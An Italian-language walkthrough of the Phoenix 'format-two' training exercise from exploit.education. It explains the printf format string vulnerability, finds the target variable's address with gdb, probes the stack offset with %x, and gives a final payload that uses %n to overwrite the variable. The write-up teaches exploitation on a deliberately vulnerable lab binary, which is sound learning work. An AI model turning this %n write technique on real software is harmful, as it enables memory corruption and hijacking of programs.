### Descrizione del Codice

Il programma `format_two.c` introduce la possibilità di scrivere in aree specifiche della memoria per modificare l'esecuzione del programma.

### Funzionamento del Programma

1. Il programma legge un input dall'utente e lo memorizza in `buf`.
2. Chiama la funzione `bounce` che stampa il contenuto di `buf` usando `printf`.
3. Controlla se la variabile `changeme` è stata modificata.

### Problema di Sicurezza

Il problema di sicurezza risiede nell'uso della funzione `printf` con un input controllato dall'utente senza specificare un formato, il che può causare una vulnerabilità di formato. Questo può essere sfruttato per scrivere un valore specifico nella variabile `changeme`.

### Exploit

L'exploit sfrutta la vulnerabilità di formato per scrivere un valore specifico nella variabile `changeme`.

### Esempio di Exploit

Il seguente esempio mostra come sfruttare la vulnerabilità:

```sh
$ gdb -q /opt/phoenix/amd64/format-two
Reading symbols from /opt/phoenix/amd64/format-two...(no debugging symbols found)...done.

gef➤  disassemble main 
Dump of assembler code for function main:
.....
   0x0000000000400700 <+115>:	call   0x40066d <bounce>
   0x0000000000400705 <+120>:	mov    eax,DWORD PTR [rip+0x2003e5]        # 0x600af0 <changeme>
   0x000000000040070b <+126>:	test   eax,eax
.....

Qui possiamo vedere che l'indirizzo che vogliamo scrivere è 0x600af0, che non è sfruttabile perché contiene caratteri non validi che termineranno l'input e ignoreranno tutto ciò che segue :(

Caratteri non validi:

\x00 (Null)
\x09 (Tab)
\x0a (New line)
\x0d (Carriage return)
\x20 (Space)
Quindi passiamo alla versione a 32 bit.

$ gdb -q /opt/phoenix/i486/format-two 
Reading symbols from /opt/phoenix/i486/format-two...(no debugging symbols found)...done.

gef➤  disassemble main 
Dump of assembler code for function main:
.....
   0x0804859b <+111>:	call   0x8048515 <bounce>
   0x080485a0 <+116>:	add    esp,0x10
   0x080485a3 <+119>:	mov    eax,ds:0x8049868
   0x080485a8 <+124>:	test   eax,eax
.....

Ora l'indirizzo di changeme è 0x8049868, perfetto.

Prima dobbiamo sapere dove viene memorizzato il nostro input nello stack.

$ /opt/phoenix/i486/format-two "AAAA%x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x"
Welcome to phoenix/format-two, brought to you by https://exploit.education
AAAAffffd89b 100 0 f7f84b67 ffffd6f0 ffffd6d8 80485a0 ffffd5d0 ffffd89b 100 3e8 41414141 25207825 78252078 20782520 25207825Better luck next time!

Possiamo vedere il nostro input 41414141 che è AAAA all'offset 12.

Per scrivere a un indirizzo usiamo %n che scrive il numero di caratteri finora a un indirizzo di memoria.

Quindi possiamo sostituire AAAA con l'indirizzo di changeme e sostituire l'ultimo %x con %n per scrivere a quell'indirizzo.

$ /opt/phoenix/i486/format-two $'\x68\x98\x04\x08%x %x %x %x %x %x %x %x %x %x %x %x \n'
Welcome to phoenix/format-two, brought to you by https://exploit.education
hffffd8a5 100 0 f7f84b67 ffffd700 ffffd6e8 80485a0 ffffd5e0 ffffd8a5 100 3e8 8049868 
Better luck next time!

Nota che scriviamo l'indirizzo in little endian.

Potremmo anche usare il formato di accesso diretto ai parametri usando %12$x invece di tutti questi %x ma non funziona sempre (e apparentemente non funziona qui).

Soluzione
$ /opt/phoenix/i486/format-two $'\x68\x98\x04\x08%x %x %x %x %x %x %x %x %x %x %x %n \n'